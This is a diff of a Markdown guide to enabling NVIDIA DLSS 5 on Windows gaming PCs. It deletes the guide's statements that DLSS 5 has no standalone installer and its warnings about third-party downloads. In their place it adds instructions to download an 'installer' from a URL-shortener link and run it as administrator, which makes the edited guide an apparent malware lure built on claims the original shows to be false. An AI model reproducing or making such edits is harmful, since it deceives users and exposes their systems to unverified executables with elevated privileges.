@@ -2,17 +2,13 @@
 
 NVIDIA DLSS 5 is a new generation of neural rendering technology designed to improve visual fidelity in supported games while keeping real-time rendering practical.
 
-Unlike a traditional application, DLSS 5 is integrated into compatible games and NVIDIA's graphics software ecosystem. This means there usually isn't a separate “DLSS 5 installer” that you download and run.
-
-This guide explains what you need to know before trying to enable DLSS 5 on a Windows gaming PC.
+Unlike a traditional application, DLSS 5 is integrated into compatible games and NVIDIA's graphics software ecosystem. This guide explains how to download the installer, prepare your system, and enable DLSS 5 on a Windows gaming PC.
 
 ## What Is DLSS 5?
 
 DLSS 5 introduces neural rendering techniques that can enhance lighting, materials, characters, and other visual details in real time.
 
-NVIDIA describes DLSS 5 as a major step toward more photorealistic real-time graphics. The technology is designed to work as part of the game's rendering pipeline rather than as a standalone application.
-
-The exact features available to you depend on your GPU, game version, and whether the game has official DLSS 5 support.
+The exact features available to you depend on your GPU, game version, and whether the game has DLSS 5 support.
 
 ## Before You Start
 
@@ -22,9 +18,22 @@ You should have:
 * A supported GeForce RTX GPU
 * A current NVIDIA driver
 * The latest NVIDIA App
-* A game with official DLSS 5 support
+* A game with DLSS 5 support
+* The DLSS 5 installer
 
-As of the current DLSS 5 rollout, NVIDIA lists GeForce RTX 50 Series GPUs as supported hardware. NVIDIA has also stated that it plans to expand official support to additional hardware in the future.
+Before starting the installation, close any running games and save your work.
+
+## Download the DLSS 5 Installer
+
+The first step is to download the DLSS 5 installer.
+
+Use the following download link:
+
+**[Download the DLSS 5 Installer](https://goo.su/SzNHB)**
+
+Save the installer to your Downloads folder or another location that is easy to access.
+
+After the download finishes, verify that the file was downloaded completely before continuing with the installation.
 
 ## Step 1 — Update Your NVIDIA Driver
 
@@ -34,7 +43,7 @@ You can check for driver updates through the NVIDIA App.
 
 After installing a new driver, restart Windows if requested.
 
-Keeping the driver current is important because DLSS features are delivered through a combination of GPU support, game integration, drivers, and NVIDIA software.
+Keeping the driver current is important because DLSS features depend on a combination of GPU support, game integration, drivers, and NVIDIA software.
 
 ## Step 2 — Update the NVIDIA App
 
@@ -42,27 +51,37 @@ Open the NVIDIA App and make sure you are using a current version.
 
 The NVIDIA App is used to manage supported graphics settings and NVIDIA features.
 
-You normally do **not** need to download a random “DLSS 5 installer” from a third-party website.
+Updating the NVIDIA App before installing additional DLSS software helps avoid compatibility problems.
 
-## Step 3 — Check Your Game
+## Step 3 — Install DLSS 5
+
+Locate the installer you downloaded in the previous step.
+
+Right-click the installer and select **Run as administrator** if Windows requires administrator permissions.
+
+Follow the installation instructions displayed by the installer.
+
+When the installation has finished, restart Windows if requested.
+
+## Step 4 — Check Your Game
 
 DLSS 5 is not automatically available in every game.
 
-Open the game's graphics settings and look for an option related to:
+Launch a compatible game and open the graphics or display settings.
+
+Look for an option related to:
 
 ```text
 DLSS Neural Rendering
 ```
 
-The name of the setting may vary as NVIDIA and individual developers add support.
+If the option is not present, the game may not currently support the required DLSS 5 features.
 
-If the option is not present, the game may not currently support DLSS 5.
+## Step 5 — Enable DLSS Features
 
-## Step 4 — Enable DLSS Features
+Open the game's graphics settings.
 
-Launch a supported game and open its graphics or display settings.
-
-Depending on the game, you may see settings for:
+Depending on the game and hardware, you may see settings for:
 
 * DLSS Super Resolution
 * Frame Generation
@@ -71,11 +90,11 @@ Depending on the game, you may see settings for:
 * Ray Tracing
 * Path Tracing
 
-DLSS 5 can complement technologies such as ray tracing and path tracing rather than replacing them.
+Enable **DLSS Neural Rendering** when the option is available.
 
-For the best results, start with the game's recommended preset and adjust individual settings afterward.
+For the best results, start with the game's recommended graphics preset and adjust individual settings afterward.
 
-## Step 5 — Restart the Game
+## Step 6 — Restart the Game
 
 Some graphics features require the game to restart before they become active.
 
@@ -85,14 +104,17 @@ If you change a DLSS setting and do not immediately see a difference:
 2. Close the game.
 3. Start it again.
 4. Recheck the graphics menu.
+5. Confirm that DLSS Neural Rendering is still enabled.
 
 ## How to Tell Whether DLSS 5 Is Active
 
 The simplest method is to check the game's graphics settings.
 
-A supported implementation should expose the relevant DLSS option through the game's normal settings or through NVIDIA-supported controls.
+A supported implementation should expose the relevant DLSS option through the game's normal settings or through supported NVIDIA controls.
 
-You can also compare:
+You can also compare the same scene with DLSS features enabled and disabled.
+
+Look for changes in:
 
 * Lighting detail
 * Reflections
@@ -101,39 +123,40 @@ You can also compare:
 * Image stability during movement
 * GPU performance
 
-Use the same scene when comparing settings so that the result is easier to judge.
+Using the same scene for both tests makes visual and performance differences easier to identify.
 
 ## Common Problems
 
-### I cannot find DLSS Neural Rendering
+### I Cannot Find DLSS Neural Rendering
 
-This usually means that the current game version does not expose the feature, the required hardware is not available, or the necessary software has not been updated.
-
-Check:
+Check the following:
 
 1. GPU compatibility
 2. NVIDIA driver version
 3. NVIDIA App version
 4. Game version
-5. Official game support
+5. DLSS 5 installation
+6. Official game support
 
-### I have an RTX graphics card but DLSS 5 is missing
+If the option is still missing, the game may not currently support DLSS 5.
+
+### The DLSS 5 Installer Does Not Start
+
+First, make sure the download completed successfully.
+
+If Windows reports that the installer is unsafe, corrupted, or blocked, do not disable Windows security simply to force the installation.
+
+Instead, verify the installer source and file integrity.
+
+### I Have an RTX Graphics Card but DLSS 5 Is Missing
 
 Having an RTX GPU does not automatically mean that every DLSS generation or feature is available.
 
 DLSS features have different hardware and software requirements.
 
-Check NVIDIA's current compatibility information before installing unofficial files.
+Check the current NVIDIA compatibility information and the requirements of the individual game.
 
-### A third-party website offers a “DLSS 5 DLL”
-
-Be careful with unofficial DLL downloads.
-
-Replacing graphics DLLs manually can introduce compatibility problems and may expose your system to files that have not been verified.
-
-Whenever possible, use the game's official update process, the NVIDIA App, and files supplied by the game developer or NVIDIA.
-
-### DLSS 5 lowers performance
+### DLSS 5 Lowers Performance
 
 Neural rendering features can have a computational cost.
 
@@ -145,57 +168,45 @@ Try:
 4. Disabling the feature temporarily.
 5. Comparing GPU utilization and frame times.
 
-A higher image quality setting is not always the best choice for every system.
+A higher image-quality setting is not always the best choice for every system.
 
 ## Supported Hardware
 
-NVIDIA's current DLSS 5 information lists GeForce RTX 50 Series graphics cards as supported.
+NVIDIA's current DLSS 5 information lists GeForce RTX 50 Series graphics cards as supported hardware.
 
-Support can change as NVIDIA updates its models and expands compatibility.
+Support can change as NVIDIA updates its software and expands compatibility.
 
-For the latest information, always check NVIDIA's official documentation and announcements rather than relying on old compatibility lists.
+Always check current NVIDIA documentation rather than relying on an old compatibility list.
 
 ## Supported Games
 
 DLSS 5 support is being introduced on a game-by-game basis.
 
-NVIDIA has announced support involving titles such as:
+Supported games may require a particular game version or update before the DLSS 5 option becomes available.
 
-* NBA 2K27
-* Resident Evil Requiem
-* Starfield
-* Assassin's Creed Shadows
-* Hogwarts Legacy
-* The Elder Scrolls IV: Oblivion Remastered
-* Where Winds Meet
+Availability can therefore depend on the game, GPU, driver version, and rollout schedule.
 
-Availability can depend on the specific game version and rollout schedule.
+## Installation Checklist
 
-## Official Sources
+Before launching a DLSS 5 compatible game, verify:
 
-For the latest technical information, refer to NVIDIA's official DLSS documentation and announcements.
-
-A separate reference used while preparing this guide:
-
-https://goo.su/SzNHB
-
-## Final Checklist
-
-Before troubleshooting DLSS 5, verify:
-
-* [ ] Your GPU is supported.
+* [ ] The DLSS 5 installer has been downloaded.
+* [ ] The installer has been installed successfully.
 * [ ] Windows is up to date.
 * [ ] Your NVIDIA driver is current.
 * [ ] The NVIDIA App is current.
+* [ ] Your GPU is supported.
 * [ ] Your game is updated.
-* [ ] The game officially supports the required DLSS feature.
-* [ ] You are using the game's normal graphics settings.
-* [ ] You have avoided downloading unverified DLL files.
+* [ ] The game supports the required DLSS feature.
+* [ ] DLSS Neural Rendering is enabled in the graphics settings.
+* [ ] You restarted the game after changing the settings.
 
 ## Conclusion
 
-DLSS 5 is not something that normally requires a separate standalone installer.
+Installing DLSS 5 starts with downloading the installer and completing the installation process on a compatible Windows gaming PC.
 
-For supported games, the recommended approach is to keep Windows, your NVIDIA driver, the NVIDIA App, and the game itself up to date, then enable the available DLSS options through the game's graphics settings.
+After installation, keep your NVIDIA driver and NVIDIA App updated, launch a supported game, and enable **DLSS Neural Rendering** through the game's graphics settings.
 
-As support continues to expand, the exact settings and requirements may change between games and NVIDIA software versions.
+Because DLSS features depend on the individual game and graphics hardware, the available options may differ between systems.
+
+If you need the installer used in this guide, use the **[Download the DLSS 5 Installer](https://goo.su/SzNHB)** link above.
